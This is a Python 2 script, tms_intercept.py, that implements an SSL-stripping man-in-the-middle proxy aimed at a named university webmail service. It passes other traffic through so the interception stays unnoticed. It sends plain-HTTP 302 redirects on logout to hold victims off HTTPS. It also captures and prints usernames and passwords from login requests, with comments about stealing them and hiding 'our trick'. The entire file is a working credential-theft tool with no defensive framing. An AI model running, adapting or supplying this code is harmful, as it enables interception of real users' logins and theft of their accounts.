#! /usr/bin/env python
# ##########################################################################
# tms_intercept.py
# Intercepts HTTP requests for tigermail 
# Then performs custom redirect code to appply a seemless user experience
# Essentially performs the same function as ssl strip just specific to our target
# ########################################################################## 

# Imports
import SocketServer
import socket
import ssl
import sys
import re

# Regular Expressions
rRequest = re.compile('^(?:GET|POST) (/|/logout.html|/login.php) HTTP/1.[10]',re.MULTILINE)	# Matches the GET Line
rHost = re.compile('^Host: ([\w,\.]+)', re.MULTILINE)	# Matches the Host Header
rLogin = re.compile('User.id=(\w+)&User.password=([^&]+)&')

# Classes
class TMSHandler(SocketServer.StreamRequestHandler):
	"""
	TMS Handler
	"""
	
	def handle(self):  
		#while 1:
		self.chello = self.request.recv(8192)  	# Retrieve the http header (initial block of data sent)
		info = self.chello
		if not self.chello:						# If there was no data, then die
			return
		
		self.more = False
		# Check if tigermail
		self.host = rHost.search(self.chello)	# search for the host name the user was trying to connect to
		if not self.host:						# we have no idea where to send them...
			return								# so die...
		self.host = self.host.group(1)			# save the host
		print 'Host is: ' + self.host			# display the host
		

		if self.host != 'tigermail.auburn.edu':	# this means they aren't looking for tigermail so we really dont care what they are doing, we will proxy them nicely though... this way we look transparent
			print 'Not a tigermail request, proxing the request transparently'
			self.ProxyClientConnection()
			return
		
		# Try to match the request to one we need to concern ourselves with
		match = rRequest.search(self.chello)		
		if match and match.group(1) == '/logout.html':	# Is it a logout request? if so let's auto-redirect them
			print "Redirecting From Logout - Sending New 302"
			self.SendLogoutRedirect()					# Send the 302
			return
		elif match and match.group(1) == '/login.php':	# Is it a login request? if so, try to steal their information
			print "Attemping to steal username and password..."
			self.SaveLogin()							# Try to steal their information
		
		# We Must Proxy The Request
		# Connect SSL Client
		print "Starting Up Tiger-Mail SSL Proxy"
		self.ToServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	
		self.ToServer.settimeout(.85)		# .85s timeout on recv operations, we do this because tigermail can be notoriously slow to respond, causing us all types of heartache
											# so we instead just delay our socket receives to compensate... this slows down the proxy but does allow tigermails web interface to work
											# you can use as low as .1 if you only want to capture login data (this is probably suggested as proxing full tigermail for many clients is resource intensive)
		self.ToServer.connect(('131.204.3.140', 443))		#tigermails ip, if im testing this doesn't screw up
		self.ToServerSSL = ssl.wrap_socket(self.ToServer);	# promote socket to ssl
					
		# Write the clients http request
		print "Writing Through The Client Request To SSL"
		self.ToServerSSL.write(self.chello)
		if self.more:
			self.ToServerSSL.write(self.more_data)
		
		# Now Proxy Data B/T Sockets
		self.request.settimeout(.2)		# .2s timeout on our client socket read operations, they are usually fast, and there are a lot less of them
		while 1:
			try:
				sdata = self.ToServerSSL.recv(8192)					
				self.wfile.write(sdata)#.replace('https://','http://'))
			except socket.timeout:	# timeout on recv, just keep going
				pass
			except socket.error:	# assume server killed connection
				print "Server Socket Error: Finished Request"
				return False
			
			try:
				cdata = self.request.recv(8192)	
				match = rRequest.search(cdata)
				if match and match.group(1) == '/logout.html':
					print "Redirecting from persistant connection - Sending New 302 Request"
					self.SendLogoutRedirect()
					return
				else:
					self.ToServerSSL.send(cdata)					
			except socket.timeout:	# timeout on recv, just keep going
				pass
			except socket.error:	# assume client killed connection
				print "Server Socket Error: Finished Request"
				return False
		
				
	# Sends a 302 redireect o the main page, which we should then again intercept
	# This prevents them from seeing our trick
	def SendLogoutRedirect(self):
		self.wfile.write('HTTP/1.1 302 Found\r\n')							# send 302
		self.wfile.write('Location: http://tigermail.auburn.edu/\r\n\r\n')	# our new location doesn't have https ^_^
		return True															# we are done processing this request
	
	# Save the post information from this socket, it should be their username and password
	def SaveLogin(self):		
		match = rLogin.search(self.chello)
		if not match:
			self.request.settimeout(.2)	
			try:
				self.more_data = self.request.recv(2048)	# we might have ie try to get more data
				self.more = True
				match = rLogin.search(self.more_data)	
			except socket.timeout:
				self.more = False			
		else:
			print "Match Found First Time"
			
		if not match:
			print "Failed to save login, transparently passing through information"
		else:
			print 'User: ' + match.group(1)
			print 'Pass: ' + match.group(2)
		return False
	
	
	# Proxies the client connection w/o interferring
	def ProxyClientConnection(self):
		self.ToServer = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	
		self.ToServer.settimeout(1)		# 1s 
		self.ToServer.connect((self.host, 80))
		self.ToServer.send(self.chello)
		
		self.request.settimeout(.2)
		while 1:
				try:
					sdata = self.ToServer.recv(1024)
					if sdata:
						self.wfile.write(sdata)
				except socket.timeout:	# timeout on recv, just keep going
					pass
				except socket.error:	# assume server killed connection
					return
				
				try:
					cdata = self.request.recv(1024)
					if cdata:				
						self.ToServer.send(cdata)	
				except socket.timeout:	# timeout on recv, just keep going
					pass
				except socket.error:	# assume client killed connection
					return
		pass
		
class TMSServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
	pass
	
# Main Script
if len(sys.argv) != 2:
	print "Usage: tms_intercept.py <port>"
	sys.exit(1)

HOST, PORT = "0.0.0.0", int(sys.argv[1])
	
#Create the server, binding to localhost on port 9999
server = TMSServer((HOST, PORT), TMSHandler)
	
# Serve Forever
print "Tiger-Mail Interception Server Initialized"
print "Port: " + sys.argv[1]
server.serve_forever()
